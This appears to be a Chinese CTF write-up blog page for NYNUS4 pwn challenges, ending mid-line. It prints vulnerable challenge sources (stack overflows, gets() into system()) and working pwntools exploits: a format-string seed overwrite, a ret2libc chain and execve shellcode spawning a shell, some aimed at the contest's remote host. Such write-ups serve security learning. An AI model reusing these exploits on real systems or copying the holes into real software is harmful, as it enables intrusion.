+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">.bss:0804A08C seed            <span class="hljs-built_in">dd</span> ?                    ; DATA XREF: main+5B↑w<br></code></pre></td></tr></table></figure>
+
+<p>我们现在知道偏移和地址，只需要把seed修改成我们想要的值，然和使用python ctypes库加载程序指定的libc库就行</p>
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>p=process(<span class="hljs-string">&#x27;./form&#x27;</span>)<br><span class="hljs-comment">#p=remote(&#x27;node01.container.race.nynusec.com&#x27;,24154)</span><br>libc=cdll.LoadLibrary(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<span class="hljs-comment">#使用ctypes的cdll来加载名为&#x27;libc.so.6&#x27;的库</span><br>seed_addr=<span class="hljs-number">0x0804A08C</span><br>pay=fmtstr_payload(<span class="hljs-number">9</span>,&#123;seed_addr:<span class="hljs-number">1</span>&#125;)<span class="hljs-comment">#修改程序的seed值</span><br>p.sendafter(<span class="hljs-string">&#x27;true&#x27;</span>,pay)<br>libc.srand(<span class="hljs-number">1</span>)<span class="hljs-comment">#使用libc库的srand函数设置随机数种子为1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):<br>    num = <span class="hljs-built_in">str</span>(libc.rand()%<span class="hljs-number">10</span>)<span class="hljs-comment">#每次生成的随机数序列是相同的。循环中，每次生成一个0到9之间的随机数</span><br>    p.sendlineafter(<span class="hljs-string">b&#x27;Please input number&#x27;</span>,num)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="源代码-2"><a href="#源代码-2" class="headerlink" title="源代码"></a>源代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-type">char</span>  name[<span class="hljs-number">0x30</span>];<br><span class="hljs-type">int</span> <span class="hljs-title function_">ini</span><span class="hljs-params">()</span>&#123;<br>	fflush(<span class="hljs-built_in">stdin</span>);<br>	fflush(<span class="hljs-built_in">stdout</span>);<br>	fflush(<span class="hljs-built_in">stderr</span>);<br>	setvbuf(<span class="hljs-built_in">stdin</span>,<span class="hljs-number">0</span>,_IONBF,<span class="hljs-number">0</span>);<br>	setvbuf(<span class="hljs-built_in">stdout</span>,<span class="hljs-number">0</span>,_IONBF,<span class="hljs-number">0</span>);<br>	setvbuf(<span class="hljs-built_in">stderr</span>,<span class="hljs-number">0</span>,_IONBF,<span class="hljs-number">0</span>);<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">menu</span><span class="hljs-params">()</span><br>&#123;<br>	<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to NYNUS4 competition&quot;</span>);<br>	fflush(<span class="hljs-built_in">stdout</span>);<br>	<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Show me your ability&quot;</span>);<br>	fflush(<span class="hljs-built_in">stdout</span>);<br>   	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>	ini();<br>	menu();<br>	setbuf(<span class="hljs-built_in">stdin</span>,<span class="hljs-number">0</span>);<br>	setbuf(<span class="hljs-built_in">stdout</span>,<span class="hljs-number">0</span>);<br>	<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please give me your name&quot;</span>);<br>	fflush(<span class="hljs-built_in">stdout</span>);<br>	mprotect(<span class="hljs-number">0x601000</span>,<span class="hljs-number">0x1000</span>,PROT_READ | PROT_WRITE|PROT_EXEC); 	<br>	read(<span class="hljs-number">0</span>,&amp;name,<span class="hljs-number">0x18</span>);<br>	<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Good name&quot;</span>);<br>	fflush(<span class="hljs-built_in">stdout</span>);<br>	<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Let us play a game, and what game do you want to play?&quot;</span>);<br>	fflush(<span class="hljs-built_in">stdout</span>);<br>	<span class="hljs-type">char</span> game[<span class="hljs-number">16</span>];<br>	read(<span class="hljs-number">0</span>,game,<span class="hljs-number">0x50</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h3><p>刚开始想使用shellcode的方式，但是没有搜到合适长度的shellcode,索性使用了ret2libc</p>
+<blockquote>
+<p>ret2libc攻击方式：针对动态链接(Dynamic linking)  编译的程序，静态链接一般利用简单ROP能构造出payload进行攻击（详见ROP博客）。一般情况下无法在程序中直接找到system、execve这一类系统函数，动态链接过程中动态连接器会将程序所有需要的链接库加载到内存进程空间，而libc.so是最基本的一个。</p>
+<p>libc.so 是 linux 下 C 语言库中的运行库glibc 动态链接版，里面包含了大量可利用的函数，ret2libc的原理便是将  libc.so  在内存中我们所需要的函数返回地址获取，进而取得控制权。通常是利用system(“&#x2F;bin&#x2F;sh”)打开shell，简单可以判定为两个步骤：</p>
+<ol>
+<li>system地址获取</li>
+<li>“&#x2F;bin&#x2F;sh”字符串地址获取</li>
+</ol>
+<p>第一次调用:plt-&gt;got-&gt;plt-&gt;公共plt-&gt;动态连接器_dl_runtime_resolve-&gt;锁定函数地址</p>
+<p>第二次:plt-&gt;got-&gt;直接锁定函数地址，此时got表已记录函数地址</p>
+<p>got表：包含函数的真实地址，包含libc函数的基址，用于泄露地址</p>
+<p>plt表：不用知道libc函数真实地址，使用plt地址就可以调用函数</p>
+</blockquote>
+<p>写这道题的时候还发生了小插曲，我找到的libc的system地址偏移是对的，但是binsh的地址是错的，解决方式就是在name的地址写入sh(等同于binsh)，再将地址传入system，这样后门函数就构造好了</p>
+<h3 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#start</span><br> <br><span class="hljs-comment">#p=process(&#x27;./pwn3&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;node01.container.race.nynusec.com&#x27;</span>,<span class="hljs-number">20413</span>)<br>elf = ELF(<span class="hljs-string">&#x27;pwn3&#x27;</span>)<br><span class="hljs-comment">#p=gdb.debug(&#x27;./pwn3&#x27;)</span><br><br><span class="hljs-comment">#params</span><br>rdi_addr = <span class="hljs-number">0x400953</span><br>rsi_r15_addr = <span class="hljs-number">0x400951</span><br>main_addr = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>format_str = <span class="hljs-number">0x4005b9</span><br>ret=<span class="hljs-number">0x04005b9</span><br><br><span class="hljs-comment">#attack</span><br>p.sendlineafter(<span class="hljs-string">&quot;Please give me your name&quot;</span>,<span class="hljs-string">b&#x27;fuck&#x27;</span>)<br>payload=<span class="hljs-string">b&#x27;M&#x27;</span>*(<span class="hljs-number">0x10</span>+<span class="hljs-number">8</span>) + p64(rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(main_addr)<br>p.sendlineafter(<span class="hljs-string">&quot;Let us play a game, and what game do you want to play?&quot;</span>,payload)<br><br>puts_addr = u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-string">&quot;puts Address: &quot;</span> + (<span class="hljs-built_in">hex</span>(puts_addr)))<br><br><span class="hljs-comment">#libc</span><br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts_addr)<br>base = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>system = base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>binsh = base + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br><span class="hljs-comment">#attack2</span><br><br>p.sendlineafter(<span class="hljs-string">&quot;Please give me your name&quot;</span>,<span class="hljs-string">b&#x27;sh;&#x27;</span>)<br><br>Payload_Shell =<span class="hljs-string">b&#x27;M&#x27;</span>*(<span class="hljs-number">0x10</span>+<span class="hljs-number">8</span>)+p64(ret) + p64(rdi_addr) + p64(<span class="hljs-number">0x6010A0</span>) + p64(system)<br>p.sendlineafter(<span class="hljs-string">&quot;Let us play a game, and what game do you want to play?&quot;</span>,Payload_Shell)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h3 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&quot;amd64&quot;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br><span class="hljs-comment">#io=process(&#x27;./pwn&#x27;)</span><br>io=remote(<span class="hljs-string">&quot;node01.container.race.nynusec.com&quot;</span>,<span class="hljs-number">22024</span>)<br>payload1=<span class="hljs-string">&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span><br>io.sendlineafter(<span class="hljs-string">&quot;Please give me your name&quot;</span>,payload1)<br>payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x6010A0</span>)<br>io.sendlineafter(<span class="hljs-string">&quot;Let us play a game, and what game do you want to play?&quot;</span>,payload2)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>这个是出题人真正想让我们使用的方式，找到一个长度小于0x18的shellcode，再覆盖ret读取</p>
+<h3 id="exp3"><a href="#exp3" class="headerlink" title="exp3"></a>exp3</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>p=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>name=<span class="hljs-number">0x6010a0</span><br>shellcode=asm(shellcraft.read(<span class="hljs-number">0</span>,name+<span class="hljs-number">20</span>,<span class="hljs-number">0x30</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(shellcode))<br>p.recvuntil(<span class="hljs-string">b&#x27;name\n&#x27;</span>)<br>p.sendline(shellcode)<br>p.recvuntil(<span class="hljs-string">b&#x27;play?\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(name))<br>p.send(asm(shellcraft.sh()))<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="ezpwngame"><a href="#ezpwngame" class="headerlink" title="ezpwngame"></a>ezpwngame</h2><h3 id="源代码-3"><a href="#源代码-3" class="headerlink" title="源代码"></a>源代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-type">int</span> flag=<span class="hljs-number">1</span>;<br><span class="hljs-type">int</span> choice=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> mark=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> HP=<span class="hljs-number">10000</span>;<br><span class="hljs-type">int</span> level=<span class="hljs-number">1</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span><br>&#123;<br>        fflush(<span class="hljs-built_in">stdin</span>);<br>        fflush(<span class="hljs-built_in">stdout</span>);<br>        fflush(<span class="hljs-built_in">stderr</span>);<br>        setvbuf(<span class="hljs-built_in">stdin</span>,<span class="hljs-number">0</span>,_IONBF,<span class="hljs-number">0</span>);<br>        setvbuf(<span class="hljs-built_in">stdout</span>,<span class="hljs-number">0</span>,_IONBF,<span class="hljs-number">0</span>);<br>        setvbuf(<span class="hljs-built_in">stderr</span>,<span class="hljs-number">0</span>,_IONBF,<span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> alarm(<span class="hljs-number">0x200</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">menu</span><span class="hljs-params">()</span><br>&#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to NYNUS4 competition!&quot;</span>);<br>        fflush(<span class="hljs-built_in">stdout</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please make your choice.&quot;</span>);<br>        fflush(<span class="hljs-built_in">stdout</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">game</span><span class="hljs-params">()</span><br>&#123;<br>        <span class="hljs-type">int</span> option=<span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> hp=<span class="hljs-number">100</span>;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You are a swordsman who encountered Boss while brushing dungeons&quot;</span>);<br>        fflush(<span class="hljs-built_in">stdout</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You have three choices in front of you&quot;</span>);<br>        fflush(<span class="hljs-built_in">stdout</span>);<br><br>        <span class="hljs-keyword">while</span>(choice!=<span class="hljs-number">3</span>)&#123;<br>                <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;option);<br>                <span class="hljs-keyword">if</span>(option==<span class="hljs-number">1</span>)<br>                &#123;<br>                        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You use your coquettish moves to attack the boss and deduct 1 health from it&quot;</span>);<br>                        fflush(<span class="hljs-built_in">stdout</span>);<br>                        HP--;<br>                &#125;<br>                <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(option==<span class="hljs-number">2</span>)<br>                &#123;<br><br>                        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You have chosen to develop obscene and wait for level improvement&quot;</span>);<br>                        fflush(<span class="hljs-built_in">stdout</span>);<br>                        level++;<br>                &#125;<br>                <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(option==<span class="hljs-number">3</span>)<br>                &#123;<br>                        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You directly stiffen the boss and die&quot;</span>);<br>                        flag=<span class="hljs-number">0</span>;<br>                        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;EXIT&quot;</span>);<br>                        <span class="hljs-keyword">break</span>;<br>                &#125;<br><br>        &#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">game2</span><span class="hljs-params">()</span><br>&#123;       <span class="hljs-type">int</span> a=<span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You found a hidden level&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;A mysterious person told you he would fulfill both of your wishes&quot;</span>);<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;a);<br>        <span class="hljs-keyword">if</span>(a==<span class="hljs-number">1</span>)<br>        &#123;<br>                <span class="hljs-type">int</span> flag=<span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(a==<span class="hljs-number">2</span>)<br>        &#123;<br>                <span class="hljs-type">int</span> flag=<span class="hljs-number">1</span>;<br>        &#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>        init();<br>        setbuf(<span class="hljs-built_in">stdout</span>,<span class="hljs-literal">NULL</span>);<br>        setbuf(<span class="hljs-built_in">stdin</span>,<span class="hljs-literal">NULL</span>);<br>        <span class="hljs-keyword">while</span>(choice!=<span class="hljs-number">3</span>)<br>        &#123;<br><br>                menu();<br>                <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;choice);<br>                <span class="hljs-keyword">if</span>(choice==<span class="hljs-number">3</span>)<br>                &#123;<br>                        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;EXIT&quot;</span>);<br>                        fflush(<span class="hljs-built_in">stdout</span>);<br>                        <span class="hljs-keyword">break</span>;<br>                &#125;<br>                <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(choice==<span class="hljs-number">1</span>)<br>                &#123;<br>                        <span class="hljs-keyword">if</span>(mark&lt;<span class="hljs-number">10000</span>)&#123;<br>                                game();<br>                                mark++;<br>                        &#125;<br>                        <span class="hljs-keyword">else</span><br><br>                        &#123;<br>                                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;EXIT&quot;</span>);<br>                                fflush(<span class="hljs-built_in">stdout</span>);<br>                                <span class="hljs-keyword">break</span>;<br>                        &#125;<br><br><br>                &#125;<br><br>                <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(choice==<span class="hljs-number">2</span>)<br>                &#123;<br><br>                        <span class="hljs-keyword">if</span>(mark!=<span class="hljs-number">5000</span>)<br>                        &#123;<br>                                game2();<br>                                k++;<br>                        &#125;<br>                        <span class="hljs-keyword">else</span><br>                        &#123;<br>                                mark--;<br>                        &#125;<br>                &#125;<br><br><br>        &#125;<br><span class="hljs-keyword">if</span>(HP==<span class="hljs-number">2387</span>&amp;&amp;mark==<span class="hljs-number">1</span>&amp;&amp;flag==<span class="hljs-number">0</span>&amp;&amp;level==<span class="hljs-number">2613</span>)<br>&#123;<br><br><br>        sub_70c2();<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">sub_70c2</span><span class="hljs-params">()</span><br>&#123;       setbuf(<span class="hljs-built_in">stdin</span>,<span class="hljs-number">0</span>);<br>        setbuf(<span class="hljs-built_in">stdout</span>,<span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Congratulation&quot;</span>);<br>        fflush(<span class="hljs-built_in">stdout</span>);<br>        <span class="hljs-type">char</span> *p=<span class="hljs-literal">NULL</span>;<br>        <span class="hljs-type">char</span> *o=<span class="hljs-literal">NULL</span>;<br>        p=(<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);<br>        o=(<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);<br>        gets(p);<br>        system(o);<br>        <span class="hljs-built_in">free</span>(p);<br>        <span class="hljs-built_in">free</span>(o);<br>        p=<span class="hljs-literal">NULL</span>;<br>        o=<span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br><br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h3><p>没有漏洞，通过伪代码看懂程序即可，通过考验后，有一个堆覆盖，只需要将binsh点写入第二个堆块</p>
+<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>p=remote(<span class="hljs-string">&#x27;node01.container.race.nynusec.com&#x27;</span>,<span class="hljs-number">20448</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;Please make your choice.&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<span class="hljs-comment">#mark+1 </span><br>p.sendlineafter(<span class="hljs-string">&#x27;You have three choices in front of you&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>level=<span class="hljs-number">2</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2611</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;You have chosen to develop obscene and wait for level improvement&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    level+=<span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;level &quot;</span>,level)<br>    <span class="hljs-comment">#level+1</span><br><span class="hljs-comment">#pause()</span><br>HR=<span class="hljs-number">9999</span><br>p.sendlineafter(<span 